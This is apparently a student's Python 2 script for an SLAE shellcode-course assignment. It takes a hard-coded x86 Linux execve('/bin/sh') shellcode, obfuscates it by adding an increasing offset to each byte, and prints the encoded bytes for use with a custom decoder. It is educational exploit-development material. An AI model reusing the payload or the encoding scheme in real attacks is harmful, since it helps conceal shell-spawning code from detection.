#!/usr/bin/python

# SLAE - Assignment 4 - Shellcode Obfuscation
# Python script to obfuscate shellcode to later decode with with custom decoder
# Author: Billy (@_hAxel)
# Student ID: PA-7462

origShellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
 

shellByteArray = bytearray(origShellcode)
newCode = bytearray()

i = 1
while len(shellByteArray) != 0:   # Loop through shellcode, add i to each byte of the shellcode, i is incremented each pass
	                                # First byte incremented by 1, second by 2, third by 3, etc.
	curByte = shellByteArray[0]
	restBytes = shellByteArray[1:]
	newByte = curByte + i
	newCode.append(newByte)
	shellByteArray = restBytes
	i = i+1


newCodeFormat = [hex(i) for i in newCode]


print "Shellcode Length: %s" % len(newCodeFormat)

print(",".join(newCodeFormat))
